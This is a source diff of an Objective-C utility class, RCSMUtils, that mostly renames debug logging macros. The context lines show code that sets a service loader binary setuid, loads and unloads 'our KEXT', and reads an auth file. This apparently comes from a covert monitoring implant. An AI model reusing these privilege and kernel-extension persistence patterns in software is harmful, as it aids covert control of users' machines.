@@ -11,7 +11,8 @@
 #import "RCSMUtils.h"
 #import "RCSMCommon.h"
 
-//#define DEBUG
+#import "RCSMDebug.h"
+#import "RCSMLogger.h"
 
 
 static RCSMUtils *sharedUtils = nil;
@@ -231,7 +232,7 @@ static RCSMUtils *sharedUtils = nil;
 
 - (BOOL)saveSLIPlist: (id)anObject atPath: (NSString *)aPath
 {
-#ifdef DEBUG
+#ifdef DEBUG_UTILS
   NSLog(@"path: %@", aPath);
 #endif
   
@@ -240,7 +241,7 @@ static RCSMUtils *sharedUtils = nil;
   
   if (success == NO)
     {
-#ifdef DEBUG
+#ifdef DEBUG_UTILS
       NSLog(@"An error occured while saving the plist file");
 #endif
       
@@ -248,7 +249,7 @@ static RCSMUtils *sharedUtils = nil;
     }
   else
     {
-#ifdef DEBUG
+#ifdef DEBUG_UTILS
       NSLog(@"Plist file saved: correctly");
 #endif
     }
@@ -289,7 +290,7 @@ static RCSMUtils *sharedUtils = nil;
     }
   else
     {
-#ifdef DEBUG
+#ifdef DEBUG_UTILS
       NSLog(@"[createSLIPlist] An error occurred");
 #endif
       
@@ -341,7 +342,7 @@ static RCSMUtils *sharedUtils = nil;
   
   if ([self makeSuidBinary: mServiceLoaderPath] == NO)
     {
-#ifdef DEBUG
+#ifdef DEBUG_UTILS
       NSLog(@"[makeSuidBinary] %@ - not enough privileges", mServiceLoaderPath);
 #endif
     }
@@ -361,7 +362,7 @@ static RCSMUtils *sharedUtils = nil;
   
   if (!binData)
     {
-#ifdef DEBUG
+#ifdef DEBUG_UTILS
       NSLog(@"[openSLIPlist] Error while opening %@", mSLIPlistPath);
 #endif
       
@@ -432,7 +433,7 @@ static RCSMUtils *sharedUtils = nil;
   
   if (success == YES)
     {
-#ifdef DEBUG
+#ifdef DEBUG_UTILS
       NSLog(@"Existence flag created successfully"); 
 #endif
       
@@ -440,7 +441,7 @@ static RCSMUtils *sharedUtils = nil;
     }
   else
     {
-#ifdef DEBUG
+#ifdef DEBUG_UTILS
       NSLog(@"Error while creating the existence flag");
 #endif
       
@@ -450,13 +451,13 @@ static RCSMUtils *sharedUtils = nil;
 
 - (BOOL)loadKext
 {
-#ifdef DEBUG
+#ifdef DEBUG_UTILS
   NSLog(@"Loading our KEXT @ %@", mKextPath);
 #endif
   
   if ([[NSFileManager defaultManager] fileExistsAtPath: mKextPath])
     {
-#ifdef DEBUG
+#ifdef DEBUG_UTILS
       NSLog(@"KEXT found");
 #endif
       NSArray *arguments = [NSArray arrayWithObjects: @"-R",
@@ -486,7 +487,7 @@ static RCSMUtils *sharedUtils = nil;
     }
   else
     {
-#ifdef DEBUG
+#ifdef DEBUG_UTILS
       NSLog(@"KEXT not found");
 #endif
       
@@ -498,13 +499,13 @@ static RCSMUtils *sharedUtils = nil;
 
 - (BOOL)unloadKext
 {
-#ifdef DEBUG
+#ifdef DEBUG_UTILS
   NSLog(@"Unloading our KEXT @ %@", mKextPath);
 #endif
   
   if ([[NSFileManager defaultManager] fileExistsAtPath: mKextPath])
     {
-#ifdef DEBUG
+#ifdef DEBUG_UTILS
       NSLog(@"KEXT found");
 #endif
       
@@ -519,7 +520,7 @@ static RCSMUtils *sharedUtils = nil;
     }
   else
     {
-#ifdef DEBUG
+#ifdef DEBUG_UTILS
       NSLog(@"KEXT not found");
 #endif
       
@@ -535,8 +536,8 @@ static RCSMUtils *sharedUtils = nil;
   
   if (!binData)
     {
-#ifdef DEBUG
-      errorLog(ME, @"Error while opening auth file");
+#ifdef DEBUG_UTILS
+      errorLog(@"Error while opening auth file");
 #endif
     
       return NO;
@@ -617,8 +618,8 @@ static RCSMUtils *sharedUtils = nil;
   
   if (!binData)
     {
-#ifdef DEBUG
-      errorLog(ME, @"Error while opening auth file");
+#ifdef DEBUG_UTILS
+      errorLog(@"Error while opening auth file");
 #endif
     
       return NO;
